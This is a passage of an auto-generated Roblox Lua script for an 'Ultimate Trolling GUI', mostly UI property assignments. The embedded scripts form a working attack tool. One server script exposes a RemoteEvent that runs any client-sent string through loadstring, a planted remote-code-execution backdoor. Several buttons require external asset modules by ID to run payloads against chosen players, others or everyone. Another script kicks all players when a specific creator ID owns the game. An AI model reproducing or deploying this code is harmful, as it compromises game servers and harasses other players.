ImageLabel74.ImageRectOffset = Vector2.new(24, 12)
ImageLabel74.ImageRectSize = Vector2.new(12, 12)
ImageLabel74.ImageTransparency = 1
ImageLabel75.Name = "NineBox_TopLeft"
ImageLabel75.Parent = ImageLabel74
ImageLabel75.Size = UDim2.new(0, 6, 0, 6)
ImageLabel75.BackgroundTransparency = 1
ImageLabel75.BorderSizePixel = 0
ImageLabel75.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel75.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel75.ImageRectOffset = Vector2.new(24, 12)
ImageLabel75.ImageRectSize = Vector2.new(6, 6)
ImageLabel76.Name = "NineBox_Top"
ImageLabel76.Parent = ImageLabel74
ImageLabel76.Position = UDim2.new(0, 6, 0, 0)
ImageLabel76.Size = UDim2.new(1, -12, 0, 6)
ImageLabel76.BackgroundTransparency = 1
ImageLabel76.BorderSizePixel = 0
ImageLabel76.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel76.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel76.ImageRectOffset = Vector2.new(30, 12)
ImageLabel76.ImageRectSize = Vector2.new(0, 6)
ImageLabel77.Name = "NineBox_TopRight"
ImageLabel77.Parent = ImageLabel74
ImageLabel77.Position = UDim2.new(1, -6, 0, 0)
ImageLabel77.Size = UDim2.new(0, 6, 0, 6)
ImageLabel77.BackgroundTransparency = 1
ImageLabel77.BorderSizePixel = 0
ImageLabel77.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel77.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel77.ImageRectOffset = Vector2.new(30, 12)
ImageLabel77.ImageRectSize = Vector2.new(6, 6)
ImageLabel78.Name = "NineBox_Left"
ImageLabel78.Parent = ImageLabel74
ImageLabel78.Position = UDim2.new(0, 0, 0, 6)
ImageLabel78.Size = UDim2.new(0, 6, 1, -12)
ImageLabel78.BackgroundTransparency = 1
ImageLabel78.BorderSizePixel = 0
ImageLabel78.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel78.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel78.ImageRectOffset = Vector2.new(24, 18)
ImageLabel78.ImageRectSize = Vector2.new(6, 0)
ImageLabel79.Name = "NineBox_Center"
ImageLabel79.Parent = ImageLabel74
ImageLabel79.Position = UDim2.new(0, 6, 0, 6)
ImageLabel79.Size = UDim2.new(1, -12, 1, -12)
ImageLabel79.BackgroundTransparency = 1
ImageLabel79.BorderSizePixel = 0
ImageLabel79.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel79.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel79.ImageRectOffset = Vector2.new(30, 18)
ImageLabel80.Name = "NineBox_Right"
ImageLabel80.Parent = ImageLabel74
ImageLabel80.Position = UDim2.new(1, -6, 0, 6)
ImageLabel80.Size = UDim2.new(0, 6, 1, -12)
ImageLabel80.BackgroundTransparency = 1
ImageLabel80.BorderSizePixel = 0
ImageLabel80.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel80.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel80.ImageRectOffset = Vector2.new(30, 18)
ImageLabel80.ImageRectSize = Vector2.new(6, 0)
ImageLabel81.Name = "NineBox_BottomLeft"
ImageLabel81.Parent = ImageLabel74
ImageLabel81.Position = UDim2.new(0, 0, 1, -6)
ImageLabel81.Size = UDim2.new(0, 6, 0, 6)
ImageLabel81.BackgroundTransparency = 1
ImageLabel81.BorderSizePixel = 0
ImageLabel81.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel81.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel81.ImageRectOffset = Vector2.new(24, 18)
ImageLabel81.ImageRectSize = Vector2.new(6, 6)
ImageLabel82.Name = "NineBox_Bottom"
ImageLabel82.Parent = ImageLabel74
ImageLabel82.Position = UDim2.new(0, 6, 1, -6)
ImageLabel82.Size = UDim2.new(1, -12, 0, 6)
ImageLabel82.BackgroundTransparency = 1
ImageLabel82.BorderSizePixel = 0
ImageLabel82.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel82.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel82.ImageRectOffset = Vector2.new(30, 18)
ImageLabel82.ImageRectSize = Vector2.new(0, 6)
ImageLabel83.Name = "NineBox_BottomRight"
ImageLabel83.Parent = ImageLabel74
ImageLabel83.Position = UDim2.new(1, -6, 1, -6)
ImageLabel83.Size = UDim2.new(0, 6, 0, 6)
ImageLabel83.BackgroundTransparency = 1
ImageLabel83.BorderSizePixel = 0
ImageLabel83.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel83.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel83.ImageRectOffset = Vector2.new(30, 18)
ImageLabel83.ImageRectSize = Vector2.new(6, 6)
Frame84.Name = "Background"
Frame84.Parent = Frame2
Frame84.Size = UDim2.new(1, 0, 1, 0)
Frame84.Active = true
Frame84.BackgroundColor = BrickColor.new("Magenta")
Frame84.BackgroundColor3 = Color3.new(0.592157, 0, 0.886275)
Frame84.BorderColor = BrickColor.new("Dark grey")
Frame84.BorderColor3 = Color3.new(0.443137, 0.443137, 0.443137)
Frame84.BorderSizePixel = 0
TextBox85.Parent = Frame1
TextBox85.Position = UDim2.new(0.0130000003, 0, 0.912999988, 0)
TextBox85.Size = UDim2.new(0, 173, 0, 22)
TextBox85.BackgroundColor = BrickColor.new("Really black")
TextBox85.BackgroundColor3 = Color3.new(0, 0, 0)
TextBox85.BackgroundTransparency = 0.94999998807907
TextBox85.BorderColor = BrickColor.new("Really black")
TextBox85.BorderColor3 = Color3.new(0, 0, 0)
TextBox85.BorderSizePixel = 0
TextBox85.ZIndex = 8
TextBox85.Font = Enum.Font.SourceSans
TextBox85.FontSize = Enum.FontSize.Size24
TextBox85.Text = ""
TextBox85.TextColor = BrickColor.new("Really black")
TextBox85.TextColor3 = Color3.new(0, 0, 0)
TextBox85.TextSize = 19
LocalScript86.Name = "ChangeScript"
LocalScript86.Parent = TextBox85
table.insert(cors,sandbox(LocalScript86,function()
	--//Scripted by Sochi\\
	script.Parent.Changed:Connect(function()
		script.Change:FireServer(script.Parent.Text)
	end)
end))
RemoteEvent87.Name = "Change"
RemoteEvent87.Parent = LocalScript86
Script88.Name = "ChangeRemoteHandler"
Script88.Parent = RemoteEvent87
table.insert(cors,sandbox(Script88,function()
	--//Scripted by Sochi\\
	script.Parent.OnServerEvent:Connect(function(skid, text)
		script.Text.Value = tostring(text)
	end)
end))
StringValue89.Name = "Text"
StringValue89.Parent = Script88
StringValue89.Value = "me"
Script90.Name = "change script remote"
Script90.Parent = LocalScript86
table.insert(cors,sandbox(Script90,function()
	if game.CreatorId  == 2173651912 then
		wait(5)
		print('skids')
		p= game.Players:GetChildren()
		for i= 1, #p do	
			p[i]:Kick("I am the owner Faq this skidded game... join da real one at https://www.roblox.com/games/4668223926/ss-game")
		end
	end
end))
ImageLabel91.Name = "Vertical"
ImageLabel91.Parent = TextBox85
ImageLabel91.Position = UDim2.new(0, 10, 0, 0)
ImageLabel91.Size = UDim2.new(1, -20, 1, 0)
ImageLabel91.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel91.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel91.BackgroundTransparency = 1
ImageLabel91.ZIndex = 7
ImageLabel91.Image = "rbxassetid://3570695787"
ImageLabel91.ScaleType = Enum.ScaleType.Slice
ImageLabel91.SliceCenter = 100, 100, 100, 100
Script92.Parent = Frame1
table.insert(cors,sandbox(Script92,function()
	local Event = Instance.new("RemoteEvent", game.ReplicatedStorage) -- This creates the remote
	Event.Name = "UTG"

	Event.OnServerEvent:connect(function(player, serverExecution)
		loadstring(serverExecution)
	end)
end))
LocalScript93.Parent = Frame1
table.insert(cors,sandbox(LocalScript93,function()
	script.Parent.Position = UDim2.new(0.5,-(script.Parent.Size.X.Offset/2),0.1,-(script.Parent.Size.Y.Offset/-20))
end))
TextLabel94.Name = "utg label"
TextLabel94.Parent = Frame1
TextLabel94.Position = UDim2.new(0.112999998, 0, 0.00600000005, 0)
TextLabel94.Size = UDim2.new(0, 241, 0, 26)
TextLabel94.BackgroundColor = BrickColor.new("Magenta")
TextLabel94.BackgroundColor3 = Color3.new(0.592157, 0, 0.890196)
TextLabel94.BorderColor = BrickColor.new("Magenta")
TextLabel94.BorderColor3 = Color3.new(0.568627, 0, 0.85098)
TextLabel94.Font = Enum.Font.SourceSans
TextLabel94.FontSize = Enum.FontSize.Size24
TextLabel94.Text = "ULTIMATE TROLLING GUI"
TextLabel94.TextColor = BrickColor.new("Institutional white")
TextLabel94.TextColor3 = Color3.new(1, 1, 1)
TextLabel94.TextSize = 24
TextLabel94.TextStrokeColor3 = Color3.new(1, 1, 1)
ImageLabel95.Name = "Frame"
ImageLabel95.Parent = Frame1
ImageLabel95.Position = UDim2.new(0.0430000015, 0, 0.0979999974, 0)
ImageLabel95.Size = UDim2.new(0, 284, 0, 20)
ImageLabel95.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel95.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel95.BackgroundTransparency = 1
ImageLabel95.Image = "rbxassetid://3570695787"
ImageLabel95.ScaleType = Enum.ScaleType.Slice
ImageLabel95.SliceCenter = 100, 100, 100, 100
ImageLabel96.Name = "Frame"
ImageLabel96.Parent = Frame1
ImageLabel96.Position = UDim2.new(0.0430000015, 0, 0.828000009, 0)
ImageLabel96.Size = UDim2.new(0, 284, 0, 22)
ImageLabel96.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel96.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel96.BackgroundTransparency = 1
ImageLabel96.BorderColor = BrickColor.new("Forest green")
ImageLabel96.BorderColor3 = Color3.new(0, 0.541176, 0)
ImageLabel96.Image = "rbxassetid://3570695787"
ImageLabel96.ImageColor3 = Color3.new(0, 0.623529, 0)
ImageLabel96.ScaleType = Enum.ScaleType.Slice
ImageLabel96.SliceCenter = 100, 100, 100, 100
TextLabel97.Parent = Frame1
TextLabel97.Position = UDim2.new(0.0680000037, 0, 0.845000029, 0)
TextLabel97.Size = UDim2.new(0, 273, 0, 9)
TextLabel97.BackgroundColor = BrickColor.new("Forest green")
TextLabel97.BackgroundColor3 = Color3.new(0, 0.619608, 0)
TextLabel97.BorderColor = BrickColor.new("Forest green")
TextLabel97.BorderColor3 = Color3.new(0, 0.631373, 0)
TextLabel97.Font = Enum.Font.SourceSans
TextLabel97.FontSize = Enum.FontSize.Size14
TextLabel97.Text = "Created By backodm#9960"
TextLabel97.TextColor = BrickColor.new("Institutional white")
TextLabel97.TextColor3 = Color3.new(1, 1, 1)
TextLabel97.TextSize = 14
TextLabel97.TextWrap = true
TextLabel97.TextWrapped = true
TextLabel98.Parent = Frame1
TextLabel98.Position = UDim2.new(0.0689999983, 0, 0.114, 0)
TextLabel98.Size = UDim2.new(0, 273, 0, 9)
TextLabel98.BackgroundColor = BrickColor.new("Institutional white")
TextLabel98.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel98.BorderColor = BrickColor.new("Institutional white")
TextLabel98.BorderColor3 = Color3.new(1, 1, 1)
TextLabel98.Font = Enum.Font.SourceSans
TextLabel98.FontSize = Enum.FontSize.Size14
TextLabel98.Text = "Gonna add more stuff soon."
TextLabel98.TextColor = BrickColor.new("Really black")
TextLabel98.TextColor3 = Color3.new(0, 0, 0)
TextLabel98.TextSize = 14
TextLabel98.TextWrap = true
TextLabel98.TextWrapped = true
ImageLabel99.Name = "Frame"
ImageLabel99.Parent = Frame1
ImageLabel99.Position = UDim2.new(0.0430000015, 0, 0.179000005, 0)
ImageLabel99.Size = UDim2.new(0, 284, 0, 216)
ImageLabel99.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel99.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel99.BackgroundTransparency = 1
ImageLabel99.Image = "rbxassetid://3570695787"
ImageLabel99.ScaleType = Enum.ScaleType.Slice
ImageLabel99.SliceCenter = 100, 100, 100, 100
ScrollingFrame100.Parent = Frame1
ScrollingFrame100.Position = UDim2.new(0.00999999978, 15, 0.187999994, 0)
ScrollingFrame100.Size = UDim2.new(0, 275, 0, 210)
ScrollingFrame100.BackgroundColor = BrickColor.new("Institutional white")
ScrollingFrame100.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame100.BorderColor = BrickColor.new("Institutional white")
ScrollingFrame100.BorderColor3 = Color3.new(1, 1, 1)
ScrollingFrame100.CanvasSize = UDim2.new(0, 0, 7, 0)
ScrollingFrame100.ScrollBarThickness = 0
TextButton101.Name = "Admin"
TextButton101.Parent = ScrollingFrame100
TextButton101.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -1156)
TextButton101.Size = UDim2.new(0, 271, 0, 21)
TextButton101.BackgroundColor = BrickColor.new("Really black")
TextButton101.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton101.BackgroundTransparency = 1
TextButton101.BorderColor = BrickColor.new("Really black")
TextButton101.BorderColor3 = Color3.new(0, 0, 0)
TextButton101.ZIndex = 7
TextButton101.Font = Enum.Font.SourceSansSemibold
TextButton101.FontSize = Enum.FontSize.Size14
TextButton101.Text = "JesJter                                                                                                  NEW!"
TextButton101.TextColor = BrickColor.new("Institutional white")
TextButton101.TextColor3 = Color3.new(1, 1, 1)
TextButton101.TextSize = 14
TextButton101.TextWrap = true
TextButton101.TextWrapped = true
TextButton101.TextXAlignment = Enum.TextXAlignment.Left
Script102.Parent = TextButton101
table.insert(cors,sandbox(Script102,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4670278173).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4670278173).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4670278173).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4670278173).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel103.Name = "Vertical"
ImageLabel103.Parent = TextButton101
ImageLabel103.Position = UDim2.new(0, -2, 0, 0)
ImageLabel103.Size = UDim2.new(1, 3, 1, 0)
ImageLabel103.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel103.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel103.BackgroundTransparency = 1
ImageLabel103.ZIndex = 3
ImageLabel103.Image = "rbxassetid://3570695787"
ImageLabel103.ImageColor3 = Color3.new(0.666667, 0, 0)
ImageLabel103.ScaleType = Enum.ScaleType.Slice
ImageLabel103.SliceCenter = 100, 100, 100, 100
TextButton104.Name = "Admin"
TextButton104.Parent = ScrollingFrame100
TextButton104.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -1132)
TextButton104.Size = UDim2.new(0, 271, 0, 21)
TextButton104.BackgroundColor = BrickColor.new("Really black")
TextButton104.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton104.BackgroundTransparency = 1
TextButton104.BorderColor = BrickColor.new("Really black")
TextButton104.BorderColor3 = Color3.new(0, 0, 0)
TextButton104.ZIndex = 7
TextButton104.Font = Enum.Font.SourceSansSemibold
TextButton104.FontSize = Enum.FontSize.Size14
TextButton104.Text = "Ufo                                                                                                           NEW!"
TextButton104.TextColor = BrickColor.new("Institutional white")
TextButton104.TextColor3 = Color3.new(1, 1, 1)
TextButton104.TextSize = 14
TextButton104.TextWrap = true
TextButton104.TextWrapped = true
TextButton104.TextXAlignment = Enum.TextXAlignment.Left
Script105.Parent = TextButton104
table.insert(cors,sandbox(Script105,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4697653739).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4697653739).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4697653739).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4697653739).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel106.Name = "Vertical"
ImageLabel106.Parent = TextButton104
ImageLabel106.Position = UDim2.new(0, -2, 0, 0)
ImageLabel106.Size = UDim2.new(1, 3, 1, 0)
ImageLabel106.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel106.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel106.BackgroundTransparency = 1
ImageLabel106.ZIndex = 3
ImageLabel106.Image = "rbxassetid://3570695787"
ImageLabel106.ImageColor3 = Color3.new(0.666667, 0, 0)
ImageLabel106.ScaleType = Enum.ScaleType.Slice
ImageLabel106.SliceCenter = 100, 100, 100, 100
TextButton107.Name = "Admin"
TextButton107.Parent = ScrollingFrame100
TextButton107.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -1108)
TextButton107.Size = UDim2.new(0, 271, 0, 21)
TextButton107.BackgroundColor = BrickColor.new("Really black")
TextButton107.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton107.BackgroundTransparency = 1
TextButton107.BorderColor = BrickColor.new("Really black")
TextButton107.BorderColor3 = Color3.new(0, 0, 0)
TextButton107.ZIndex = 7
TextButton107.Font = Enum.Font.SourceSansSemibold
TextButton107.FontSize = Enum.FontSize.Size14
TextButton107.Text = "Zenith BR-76"
TextButton107.TextColor = BrickColor.new("Institutional white")
TextButton107.TextColor3 = Color3.new(1, 1, 1)
TextButton107.TextSize = 14
TextButton107.TextWrap = true
TextButton107.TextWrapped = true
TextButton107.TextXAlignment = Enum.TextXAlignment.Left
Script108.Parent = TextButton107
table.insert(cors,sandbox(Script108,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4612595031).Fire(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4612595031).Fire(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4612595031).Fire(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4612595031).Fire(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel109.Name = "Vertical"
ImageLabel109.Parent = TextButton107
ImageLabel109.Position = UDim2.new(0, -2, 0, 0)
ImageLabel109.Size = UDim2.new(1, 3, 1, 0)
ImageLabel109.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel109.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel109.BackgroundTransparency = 1
ImageLabel109.ZIndex = 3
ImageLabel109.Image = "rbxassetid://3570695787"
ImageLabel109.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel109.ScaleType = Enum.ScaleType.Slice
ImageLabel109.SliceCenter = 100, 100, 100, 100
TextButton110.Name = "Admin"
TextButton110.Parent = ScrollingFrame100
TextButton110.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -1084)
TextButton110.Size = UDim2.new(0, 271, 0, 21)
TextButton110.BackgroundColor = BrickColor.new("Really black")
TextButton110.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton110.BackgroundTransparency = 1
TextButton110.BorderColor = BrickColor.new("Really black")
TextButton110.BorderColor3 = Color3.new(0, 0, 0)
TextButton110.ZIndex = 7
TextButton110.Font = Enum.Font.SourceSansSemibold
TextButton110.FontSize = Enum.FontSize.Size14
TextButton110.Text = "Caducus"
TextButton110.TextColor = BrickColor.new("Institutional white")
TextButton110.TextColor3 = Color3.new(1, 1, 1)
TextButton110.TextSize = 14
TextButton110.TextWrap = true
TextButton110.TextWrapped = true
TextButton110.TextXAlignment = Enum.TextXAlignment.Left
Script111.Parent = TextButton110
table.insert(cors,sandbox(Script111,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4620342625):Fire(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4620342625):Fire(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4620342625):Fire(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4620342625):Fire(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel112.Name = "Vertical"
ImageLabel112.Parent = TextButton110
ImageLabel112.Position = UDim2.new(0, -2, 0, 0)
ImageLabel112.Size = UDim2.new(1, 3, 1, 0)
ImageLabel112.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel112.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel112.BackgroundTransparency = 1
ImageLabel112.ZIndex = 3
ImageLabel112.Image = "rbxassetid://3570695787"
ImageLabel112.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel112.ScaleType = Enum.ScaleType.Slice
ImageLabel112.SliceCenter = 100, 100, 100, 100
TextButton113.Name = "Admin"
TextButton113.Parent = ScrollingFrame100
TextButton113.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -1060)
TextButton113.Size = UDim2.new(0, 271, 0, 21)
TextButton113.BackgroundColor = BrickColor.new("Really black")
TextButton113.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton113.BackgroundTransparency = 1
TextButton113.BorderColor = BrickColor.new("Really black")
TextButton113.BorderColor3 = Color3.new(0, 0, 0)
TextButton113.ZIndex = 7
TextButton113.Font = Enum.Font.SourceSansSemibold
TextButton113.FontSize = Enum.FontSize.Size14
TextButton113.Text = "Killbot V2"
TextButton113.TextColor = BrickColor.new("Institutional white")
TextButton113.TextColor3 = Color3.new(1, 1, 1)
TextButton113.TextSize = 14
TextButton113.TextWrap = true
TextButton113.TextWrapped = true
TextButton113.TextXAlignment = Enum.TextXAlignment.Left
Script114.Parent = TextButton113
table.insert(cors,sandbox(Script114,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4612625355).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4612625355).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4612625355).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4612625355).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel115.Name = "Vertical"
ImageLabel115.Parent = TextButton113
ImageLabel115.Position = UDim2.new(0, -2, 0, 0)
ImageLabel115.Size = UDim2.new(1, 3, 1, 0)
ImageLabel115.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel115.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel115.BackgroundTransparency = 1
ImageLabel115.ZIndex = 3
ImageLabel115.Image = "rbxassetid://3570695787"
ImageLabel115.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel115.ScaleType = Enum.ScaleType.Slice
ImageLabel115.SliceCenter = 100, 100, 100, 100
TextButton116.Name = "Admin"
TextButton116.Parent = ScrollingFrame100
TextButton116.Position = UDim2.new(-0.0900000036, 27, 0.486999989, -1036)
TextButton116.Size = UDim2.new(0, 271, 0, 21)
TextButton116.BackgroundColor = BrickColor.new("Really black")
TextButton116.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton116.BackgroundTransparency = 1
TextButton116.BorderColor = BrickColor.new("Really black")
TextButton116.BorderColor3 = Color3.new(0, 0, 0)
TextButton116.ZIndex = 7
TextButton116.Font = Enum.Font.SourceSansSemibold
TextButton116.FontSize = Enum.FontSize.Size14
TextButton116.Text = "Maddox"
TextButton116.TextColor = BrickColor.new("Institutional white")
TextButton116.TextColor3 = Color3.new(1, 1, 1)
TextButton116.TextSize = 14
TextButton116.TextWrap = true
TextButton116.TextWrapped = true
TextButton116.TextXAlignment = Enum.TextXAlignment.Left
Script117.Parent = TextButton116
table.insert(cors,sandbox(Script117,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4612654181):Fire(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4612654181):Fire(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4612654181):Fire(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4612654181):Fire(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel118.Name = "Vertical"
ImageLabel118.Parent = TextButton116
ImageLabel118.Position = UDim2.new(0, -2, 0, 0)
ImageLabel118.Size = UDim2.new(1, 3, 1, 0)
ImageLabel118.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel118.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel118.BackgroundTransparency = 1
ImageLabel118.ZIndex = 3
ImageLabel118.Image = "rbxassetid://3570695787"
ImageLabel118.ImageColor3 = Color3.new(1, 0.486275, 0.494118)
ImageLabel118.ScaleType = Enum.ScaleType.Slice
ImageLabel118.SliceCenter = 100, 100, 100, 100
TextButton119.Name = "Admin"
TextButton119.Parent = ScrollingFrame100
TextButton119.Position = UDim2.new(-0.0900000036, 27, 0.486999989, 452)
TextButton119.Size = UDim2.new(0, 271, 0, 21)
TextButton119.BackgroundColor = BrickColor.new("Really black")
TextButton119.BackgroundColor3 = Color3.new(0, 0, 0)
TextButton119.BackgroundTransparency = 1
TextButton119.BorderColor = BrickColor.new("Really black")
TextButton119.BorderColor3 = Color3.new(0, 0, 0)
TextButton119.ZIndex = 7
TextButton119.Font = Enum.Font.SourceSansSemibold
TextButton119.FontSize = Enum.FontSize.Size14
TextButton119.Text = "Sin"
TextButton119.TextColor = BrickColor.new("Institutional white")
TextButton119.TextColor3 = Color3.new(1, 1, 1)
TextButton119.TextSize = 14
TextButton119.TextWrap = true
TextButton119.TextWrapped = true
TextButton119.TextXAlignment = Enum.TextXAlignment.Left
Script120.Parent = TextButton119
table.insert(cors,sandbox(Script120,function()
	--//Scripted by Sochi\\
	function generatevbucks(memer)
		local player = script.Parent.Parent.Parent.Parent.Parent.Parent
		if memer == "me" then
			require(4666468021).load(player.Name)
		end
		if memer == "all" or memer == "everyone" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				require(4666468021).load(skid.Name)
			end
		end
		if memer == "others" then
			for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
				if skid.Name ~= player.Name then
					require(4666468021).load(skid.Name)
				end
			end
		end
		for _, skid in pairs(game:GetService("Players"):GetPlayers()) do
			if string.sub(string.lower(skid.Name), 0, string.len(memer)) == string.lower(memer) then
				if skid ~= nil then
					require(4666468021).load(skid.Name,"loaf")
				end
			end
		end
	end
	script.Parent.MouseButton1Click:Connect(function()
		generatevbucks(script.Parent.Parent.Parent.TextBox.ChangeScript.Change.ChangeRemoteHandler.Text.Value)
	end)
end))
ImageLabel121.Name = "Vertical"
ImageLabel121.Parent = TextButton119
ImageLabel121.Position = UDim2.new(0, -2, 0, 0)
ImageLabel121.Size = UDim2.new(1, 3, 1, 0)
ImageLabel121.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel121.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel121.BackgroundTransparency = 1
ImageLabel121.ZIndex = 3
ImageLabel121.Image = "rbxassetid://3570695787"
